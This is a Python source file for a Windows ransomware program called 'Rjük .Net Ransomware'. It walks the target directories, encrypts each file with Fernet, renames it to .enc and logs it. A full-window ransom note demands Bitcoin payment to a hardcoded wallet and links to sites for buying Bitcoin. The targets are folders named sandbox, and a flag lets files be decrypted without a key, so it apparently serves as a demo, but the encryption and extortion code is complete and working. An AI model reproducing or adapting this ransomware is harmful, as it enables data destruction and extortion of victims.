import tkinter as tk
import socket
from tkinter.ttk import *
from tkinter import *
from win32api import GetSystemMetrics 
import multiprocessing
from cryptography.fernet import Fernet
import webbrowser
import os

hostname=socket.gethostname()    # Get Hostname
IPAddr=socket.gethostbyname(hostname)   # Get IP
# This can be used for future features #

root = tk.Tk()
canvas = Canvas()
screensize = [f'{GetSystemMetrics(0)}', f'{GetSystemMetrics(1)}'] # Get resolution of monitor (1920x1080)
btc_wallet=str("bc1qgvsjxmw0t6jcezdxjg7n4yu08t5skm2f36zemt") # Bitcoin Addr to show on Msg
noKey=int(1) # No Decryption Key Requirement #
# Decryption button requires no key #

user = os.getlogin() # Get Username of PC Directory (users)
cache_path=str(f"C:\\Users\\{user}\\Documents\\230") # Path to install the virus too ( MUST HAVE \\ not \ )
cache_name=str(f"encrypted.txt") # Cache file name to read and write too
cache_mem=[] # !DO NOT TOUCH THIS!
encrypt_directories=[
                    f'C:\\Users\\{user}\\OneDrive\\Desktop\\sandbox_1',
                    f'C:\\Users\\{user}\\OneDrive\\Desktop\\sandbox_2',
                    f'C:\\Users\\{user}\\OneDrive\\Desktop\\sandbox_3',
                    ]

class api():
    def open_coinmama():
        webbrowser.open('www.coinmama.com')
    def open_moonpay():
        webbrowser.open('www.moonpay.com/buy/btc')
    def open_guide():
        webbrowser.open('https://youtu.be/1ee0OG1fZck')

class win_gui32_Frame():
    def asset_registry():
        # /?Add Assets Here?/ #
        bge="#242424"
        root.configure(bg=f"{bge}")
        Header = tk.Label(root, text="Rjük .Net Ransomware", font=("Arial Bold", 22), bg=f"{bge}", fg="white")
        r1 = tk.Label(root, text=f"""
All of your files have been encrypted!
Your computer was infected with a ransomware virus. Your files have been encrypted you won't
be able to decrypt them without paying a small fee, That is how it works.
Once you pay a fee of whatever amount is required you will then have to input your BLOCK ID
recieved when you have sent the money to us. This payment should be in BITCOIN/BTC to our private wallet.
Only then will you recieve a block id which you can use to decrypt the software and remove the virus.
This is the only way.
How do I pay, Where do I get Bitcoin?
Purchasing Bitcoin varies from country to country, You are best advised to do a quick google search
yourself to find out how to buy Bitcoin.
Many of our customers have reported these sites to be fast and reliable.
Coinmama - www.coinmama.com
Moonpay - www.moonpay.com/buy/btc

Payment Information Amount: 0.020892BTC    *(USD$350)*
Bitcoin Address To Be Used: {btc_wallet}
        """, font=("Arial Bold", 8), bg=f"{bge}", fg="white", anchor="w", justify=LEFT)
        Header.place(relx=0.02, rely=0.02)
        r1.place(relx=0.02, rely=0.1)
        decADDR=Entry(root, width=44)
        decADDR.place(relx=0.247, rely=0.75)
        decADDR.insert(0, f"{btc_wallet}")
        # Extra Assets #
        adb_button = Button(root, text="Decrypt", font=("Arial Bold", 8), bg=f"{bge}", fg="white", anchor="w", justify=LEFT, height=1, command = infec.decrypt)
        adb_text = Label(root, text="Decryption Key:", font=("Arial Bold", 8), bg=f"{bge}", fg="white", anchor="w", justify=LEFT)
        adb = Entry(root, width=64)
        adb.place(relx=0.02, rely=0.9)
        adb_text.place(relx=0.02, rely=0.85)
        adb_button.place(relx=0.57, rely=0.9)
        # /?Add Extra Assets Here?/ #
        adb1_button = Button(root, text="Coinmama", font=("Arial Bold", 8), bg=f"{bge}", fg="white", anchor="w", justify=LEFT, height=1, command = api.open_coinmama)
        adb2_button = Button(root, text="Moonpay   ", font=("Arial Bold", 8), bg=f"{bge}", fg="white", anchor="w", justify=LEFT, height=1, command = api.open_moonpay)
        adb1_button.place(relx=0.85, rely=0.85)
        adb2_button.place(relx=0.85, rely=0.91)

def disable_event():
    win_gui32.restartAssets()

class win_gui32():
    def restartAssets():
        win_gui32_Frame.asset_registry()
    def updategui():
        root.update()
    def startgui():
        #root.overrideredirect(1)
        root.protocol("WM_DELETE_WINDOW", disable_event)
        root.resizable(0,0)
        root.protocol()
        root.attributes('-alpha', 1)
        root.geometry(f'{screensize[0]}x{screensize[1]}')
        root.attributes("-topmost", True, '-toolwindow', True)
        root.title("")
        root.geometry('712x371')
        win_gui32_Frame.asset_registry() # /?Assign Assets to Main Window Frame?/ #
        while True:
            win_gui32.updategui()

class infec():
    def write_cache(inst):
        with open(f"{cache_path}\\{cache_name}", 'a') as f:
            f.write(f"\n{inst}")
    def chk_cache():
        isExist = os.path.exists(cache_path)
        if not isExist:
            os.makedirs(cache_path)
        is_exist = os.path.isfile(f"{cache_path}\\{cache_name}")
        if is_exist:
            pass
        else:
            with open(f"{cache_path}\\{cache_name}", 'w') as f:
                f.write("")
            with open(f"{cache_path}\\c.key", 'wb') as f:
                gen_key = Fernet.generate_key()
                f.write(gen_key)
        with open(f"{cache_path}\\{cache_name}", 'r') as f:
            for lines in f:
                cache_mem.append(lines)
        with open(f"{cache_path}\\c.key", 'rb') as f:
            global dec_key
            dec_key=f.read()
    def encrypt():
        infec.chk_cache()
        for dic in encrypt_directories:
            for root, dirs, files in os.walk(dic):
                for file in files:
                    if file in cache_mem:
                        pass
                    else:
                        try:
                            if f"{root}\\{file}" in cache_mem:
                                pass
                            else:
                                with open(f"{root}\\{file}", "rb") as readFile:
                                    contents=readFile.read()
                                contents_encrypted = Fernet(dec_key).encrypt(contents)
                                with open(f"{root}\\{file}", "wb") as writeFile:
                                    writeFile.write(contents_encrypted)
                                result = os.path.splitext(file)[0]
                                fek=str(f"{root}\\{result}.enc")
                                os.rename(f"{root}\\{file}", f"{fek}")
                                infec.write_cache(inst=fek)
                                cache_mem.append(fek)
                        except:
                            print(f"IO Error File: {file}")

    def decrypt():
        if noKey == int(0):
            pass
        else:
            # Decrypt Files #
            try:
                p1.terminate()
            except:
                pass
            try:
                p1.kill()
            except:
                pass
            with open(f"{cache_path}\\{cache_name}", 'r') as f:
                cache_mem.clear()
                for lines in f:
                    cache_mem.append(lines)
            for x in cache_mem:
                if x == "\n":
                    pass
                else:
                    try:
                        with open(f"{cache_path}\\c.key", 'rb') as f:
                            dec_key=f.read()
                        ou=Fernet(dec_key)
                        with open(f"{x}", "r") as get_content:
                            contents=get_content.read()
                        decryptedContents = ou.decrypt(contents).decode('utf-8')
                        with open(f"{x}", "w") as write_content:
                            write_content.write(str(decryptedContents))
                    except:
                        print(f"File Missing: {x}")
            with open(f"{cache_path}\\{cache_name}", 'w') as clear_cache:
                clear_cache.write("")

if __name__=="__main__":
    global p1
    p1 = multiprocessing.Process(target=infec.encrypt)
    p1.start()
    win_gui32.startgui()